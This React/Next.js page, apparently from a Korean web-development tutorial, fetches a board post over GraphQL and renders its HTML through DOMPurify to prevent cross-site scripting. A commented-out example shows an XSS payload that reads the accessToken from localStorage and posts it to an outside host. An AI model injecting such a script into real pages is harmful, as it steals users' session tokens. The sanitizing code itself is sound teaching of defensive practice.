import { gql, useQuery } from "@apollo/client";
import { useRouter } from "next/router";
import Dompurify from "dompurify";

const FETCH_BOARD = gql`
  query fetchBoard($boardId: ID!) {
    fetchBoard(boardId: $boardId) {
      _id
      writer
      title
      contents
    }
  }
`;
export default function WebEditorDetailPage() {
  const router = useRouter();
  const { data } = useQuery(FETCH_BOARD, {
    variables: { boardId: router.query.id },
  });

  return (
    <div>
      <div>작성자 : {data?.fetchBoard.writer} </div>
      <div>제목 : {data?.fetchBoard.title}</div>
      {/* <div>내용 : {data?.fetchBoard.contents}</div> */}
      {/* 브라우저인 경우만 렌더링 될 수 있도록 한다. (Dompuify가 Dom을 건드리기 때문에 서버에서 처음 그려낼때 오류가 난다.) */}
      {typeof window !== "undefined" && (
        <div
          dangerouslySetInnerHTML={{
            __html: Dompurify.sanitize(data?.fetchBoard.contents),
          }}
        ></div>
      )}
      {/* Cross Site Script(XSS) 위험이 있다. */}
      {/* <div
        dangerouslySetInnerHTML={{ __html: "<script>const aaa= localStorage.getItem('accessToken'); axios.post('http://mybackEnd.com/graphql', {data:aaa})</script>" }}
      ></div> */}
    </div>
  );
}
